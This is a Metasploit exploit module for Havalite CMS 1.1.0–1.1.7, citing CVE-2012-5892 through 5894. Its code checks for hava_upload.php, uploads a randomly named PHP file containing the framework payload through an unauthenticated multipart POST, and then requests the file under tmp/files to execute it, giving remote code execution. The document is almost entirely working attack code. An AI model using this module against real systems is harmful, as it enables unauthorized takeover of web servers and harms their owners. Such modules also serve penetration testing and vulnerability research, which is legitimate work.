require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
Rank = GreatRanking
 
include Msf::Exploit::Remote::HttpClient
 
def initialize(info={})
super(update_info(info,
'Name'           => "Havalite v1.1.0->1.1.7 File Upload and Command Execution",
'Description'    => %q{
This module exploits a Multiple cross-site request forgery (CSRF) vulnerabilities
in hava_upload.php in Havalite 1.1.7 allow remote attackers can upload file.
},
'License'        => MSF_LICENSE,
'Author'         =>
[
'KedAns-Dz <ked-h[at]1337day.com>', # Discovery PoC ,and Metasploit module
],
'References'     =>
[
['CVE', '2012-5892','2012-5893','2012-5894'],
['OSVDB', '80770','80769','80768'],
['URL', 'http://1337day.com/exploit/description/17877'], # 1337ID-17877
['URL', 'http://packetstormsecurity.org/files/111358/Havalite-CMS-Shell-Upload-SQL-Injection-Disclosure.html'] # PS-SEC-111358
],
'Payload'        =>
{
'BadChars' => "\x00"
},
'DefaultOptions'  =>
{
'ExitFunction' => "none"
},
'Platform'       => ['php'],
'Arch'           => ARCH_PHP,
'Targets'        =>
[
['Havalite v1.1.7', {}]
],
'Privileged'     => false,
'DisclosureDate' => "Dec 10 2012",
'DefaultTarget'  => 0))
 
register_options(
[
OptString.new('TARGETURI', [true, 'The base path to Havelite', '/havelite'])
], self.class)
end
 
def check
uri = target_uri.path
uri << '/' if uri[-1,1] != '/'
 
res = send_request_cgi({
'method' => 'GET',
'uri'    => "#{uri}hava_upload.php"
})
 
if res and res.code == 200 and res.body.empty?
return Exploit::CheckCode::Detected
else
return Exploit::CheckCode::Safe
end
end
 
def exploit
uri = target_uri.path
uri << '/' if uri[-1,1] != '/'
 
peer = "#{rhost}:#{rport}"
payload_name = Rex::Text.rand_text_alpha(rand(5) + 5) + '.php'
 
post_data = "--1337day\r\n"
post_data << "Content-Disposition: form-data; name=\"Filedata\"; filename=\"#{payload_name}\"\r\n\r\n"
post_data << "Content-Type : text/html;\r\n"
post_data << "<?php "
post_data << payload.encoded
post_data << " ?>\r\n"
post_data << "--1337day\r\n"
 
print_status("#{peer} - Sending PHP payload (#{payload_name})")
res = send_request_cgi({
'method' => 'POST',
'uri'    => "#{uri}hava_upload.php",
'ctype'  => 'multipart/form-data; boundary=1337day',
'data'   => post_data
})
 
if not res or res.code != 200 or res.body !~ /#{payload_name}/
print_error("#{peer} - I don't think the file was uploaded !")
return
end
 
print_status("#{peer} - Executing PHP payload (#{payload_name})")
# Execute our payload
res = send_request_cgi({
'method' => 'GET',
'uri'    => "#{uri}tmp/files/#{payload_name}"
})
 
if res and res.code != 200
print_status("#{peer} - Server returns #{res.code.to_s}")
end
end
